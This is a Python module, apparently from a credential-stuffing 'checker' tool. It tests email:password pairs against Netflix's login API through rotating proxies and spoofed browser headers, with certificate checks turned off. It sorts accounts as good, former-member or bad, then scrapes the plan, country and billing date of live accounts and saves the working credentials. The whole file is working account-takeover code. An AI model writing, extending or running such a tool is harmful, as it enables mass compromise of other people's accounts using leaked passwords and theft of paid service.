from modules.variables import Checker
from modules.functions import set_proxy,log,save, bad_proxy
from requests import Session
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def check(email:str,password:str):
    retries = 0
    while retries != Checker.retries:
        proxy = set_proxy()
        proxy_set = set_proxy(proxy)

        data = f"email={email}&password={password}&setCookies=true"
        header_1 = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko", 
            "Pragma": "no-cache" ,
            "Accept": "*/*" 
        }
        header_2 = {
            "Content-Type":"application/x-www-form-urlencoded",
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" ,
            "Pragma": "no-cache" ,
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8" ,
            "Referer": "https://www.netflix.com/Login" 
        }
        header_3 = {
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9" ,
            "Accept-Encoding": "gzip, deflate, br" ,
            "Accept-Language": "en-US,en;q=0.9" ,
            "Connection": "keep-alive" ,
            "Host": "www.netflix.com" ,
            "Referer": "https://www.netflix.com/browse" ,
            "Sec-Fetch-Dest": "document" ,
            "Sec-Fetch-Mode": "navigate" ,
            "Sec-Fetch-Site": "same-origin" ,
            "Sec-Fetch-User": "?1" ,
            "Upgrade-Insecure-Requests": "1" ,
            "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 13_2_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Mobile/15E148 Safari/604.1"
        }
        try:
            with Session() as s:
                cookie = dict(flwssn=s.get("https://www.netflix.com/au/login",headers=header_1,proxies=proxy_set,timeout=Checker.timeout).cookies.get("flwssn"))
                response = s.post("https://api-global.netflix.com/account/auth",headers=header_2,data=data,verify=False,proxies=proxy_set,timeout=Checker.timeout).text
                if "NetflixId\":null,\"user\":{\"" in response or "Incorrect email address or password" in response or "Missing password" in response or "NEVER_MEMBER" in response:
                    retries += 1
                elif "FORMER_MEMBER" in response:
                    Checker.custom += 1
                    Checker.cpm += 1
                    if not Checker.cui:
                        log("custom",email+":"+password,"Netflix")
                    save("Netflix","custom",Checker.time,email+":"+password)
                    return
                elif "CURRENT_MEMBER" in response:
                    info = s.get("https://www.netflix.com/YourAccount",headers=header_3,cookies=cookie,proxies=proxy_set,timeout=Checker.timeout).text
                    plan = info.split('data-uia="plan-label"><b>')[1].split('</b>')[0]
                    country = info.split('","currentCountry":"')[1].split('"')[0]
                    expire = info.split('data-uia="nextBillingDate-item">')[1].split('<')[0]
                    Checker.good += 1
                    Checker.cpm += 1
                    if not Checker.cui:
                        log("good",email+":"+password,"Netflix")
                    save("Netflix","good",Checker.time,email+":"+password+f" | Plan: {plan} | Country: {country} | Expire: {expire}")
                    return
                else:
                    raise
        except:
            bad_proxy(proxy)
            Checker.errors += 1
    Checker.bad += 1
    Checker.cpm += 1
    return